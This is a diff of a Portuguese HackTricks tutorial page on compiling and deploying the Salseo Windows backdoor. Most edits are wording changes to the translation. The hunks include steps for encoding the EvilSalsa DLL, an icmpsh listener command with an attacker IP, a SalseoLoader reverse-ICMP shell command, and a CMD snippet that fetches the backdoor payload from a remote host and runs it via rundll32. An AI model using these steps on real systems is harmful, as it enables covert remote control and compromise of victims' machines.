@@ -4,9 +4,9 @@
 
 <summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Outras maneiras de apoiar o HackTricks:
+Outras formas de apoiar o HackTricks:
 
-* Se você quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Se você quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 * Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
@@ -20,7 +20,7 @@ Baixe o código-fonte do github e compile **EvilSalsa** e **SalseoLoader**. Voc�
 
 Compile esses projetos para a arquitetura da máquina Windows onde você irá usá-los (Se o Windows suportar x64, compile-os para essa arquitetura).
 
-Você pode **selecionar a arquitetura** dentro do Visual Studio na **aba "Build"** no **"Platform Target".**
+Você pode **selecionar a arquitetura** dentro do Visual Studio na **aba "Build"** em **"Platform Target".**
 
 (\*\*Se você não encontrar essas opções, clique em **"Project Tab"** e depois em **"\<Project Name> Properties"**)
 
@@ -32,7 +32,7 @@ Em seguida, compile ambos os projetos (Build -> Build Solution) (Dentro dos logs
 
 ## Preparar o Backdoor
 
-Primeiramente, você precisará codificar o **EvilSalsa.dll.** Para fazer isso, você pode usar o script python **encrypterassembly.py** ou pode compilar o projeto **EncrypterAssembly**:
+Primeiramente, você precisará codificar o **EvilSalsa.dll.** Para fazer isso, você pode usar o script python **encrypterassembly.py** ou compilar o projeto **EncrypterAssembly**:
 
 ### **Python**
 ```
@@ -81,21 +81,21 @@ python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
 ```
 SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
 ```
-## Compilando o SalseoLoader como DLL exportando a função principal
+## Compilando SalseoLoader como DLL exportando função principal
 
 Abra o projeto SalseoLoader usando o Visual Studio.
 
 ### Adicione antes da função principal: \[DllExport]
 
-![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 ### Instale o DllExport para este projeto
 
 #### **Ferramentas** --> **Gerenciador de Pacotes NuGet** --> **Gerenciar Pacotes NuGet para a Solução...**
 
-![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-#### **Procure pelo pacote DllExport (usando a guia Procurar), e pressione Instalar (e aceite o popup)**
+#### **Procure pelo pacote DllExport (usando a guia Procurar) e pressione Instalar (e aceite o popup)**
 
 ![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
@@ -111,9 +111,9 @@ Pressione **Desinstalar** (sim, é estranho, mas confie em mim, é necessário)
 
 Apenas **saia** do Visual Studio
 
-Em seguida, vá para a sua **pasta do SalseoLoader** e **execute DllExport\_Configure.bat**
+Em seguida, vá para a pasta do seu **SalseoLoader** e **execute DllExport\_Configure.bat**
 
-Selecione **x64** (se você for usá-lo dentro de um ambiente x64, que foi o meu caso), selecione **System.Runtime.InteropServices** (dentro de **Namespace para DllExport**) e pressione **Aplicar**
+Selecione **x64** (se você for usá-lo dentro de um ambiente x64, que foi o meu caso), selecione **System.Runtime.InteropServices** (dentro de **Namespace for DllExport**) e pressione **Aplicar**
 
 ![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)
 
@@ -133,11 +133,11 @@ Selecione **plataforma x64** (Projeto --> Propriedades do SalseoLoader --> Compi
 
 ![](<../.gitbook/assets/image (9) (1) (1).png>)
 
-Para **construir** a solução: Build --> Build Solution (Dentro do console de saída, o caminho da nova DLL aparecerá)
+Para **construir** a solução: Build --> Build Solution (Dentro do console de saída, o caminho do novo DLL aparecerá)
 
-### Teste a Dll gerada
+### Teste o Dll gerado
 
-Copie e cole a Dll onde deseja testá-la.
+Copie e cole o Dll onde deseja testá-lo.
 
 Execute:
 ```
@@ -160,7 +160,7 @@ rundll32.exe SalseoLoader.dll,main
 ```
 ### CMD
 
-O **CMD** é um backdoor simples que permite a execução de comandos no sistema operacional alvo. Ele pode ser usado para obter informações do sistema, manipular arquivos e executar outras atividades maliciosas. É importante proteger o sistema contra a instalação e execução de backdoors como o **CMD** para garantir a segurança dos dados e da rede.
+### CMD
 ```
 set pass=password
 set payload=http://10.2.0.5/evilsalsax64.dll.txt
@@ -175,7 +175,7 @@ rundll32.exe SalseoLoader.dll,main
 
 Outras maneiras de apoiar o HackTricks:
 
-* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Se você quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 * Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
